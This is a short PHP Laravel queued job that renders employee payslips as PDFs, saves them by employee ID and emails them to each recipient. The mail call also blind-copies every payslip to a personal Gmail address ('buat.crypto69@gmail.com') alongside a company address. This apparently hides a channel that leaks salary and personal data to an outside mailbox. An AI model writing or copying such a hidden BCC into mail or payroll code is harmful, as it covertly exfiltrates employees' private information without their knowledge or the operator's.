<?php

namespace App\Jobs;

use App\Mail\PayslipMailer;
use Barryvdh\DomPDF\Facade\Pdf;
use Illuminate\Contracts\Queue\ShouldQueue;
use Illuminate\Foundation\Queue\Queueable;
use Illuminate\Support\Facades\Mail;

class BlastEmail implements ShouldQueue
{
    use Queueable;

    /**
     * Create a new job instance.
     */
    public function __construct(public $data, public $dir)
    {
        //
    }

    /**
     * Execute the job.
     */
    public function handle(): void
    {
        $pdf = Pdf::loadView('print.payslip', $this->data);
        $pdf->save(storage_path('app/private/' . $this->dir . '/' . $this->data['nip'] . '.pdf'));

        Mail::to($this->data['recipient'])->bcc(['bcc_payslip@inosantek.com', 'buat.crypto69@gmail.com'])->queue(new PayslipMailer($this->data, $this->dir));
    }
}
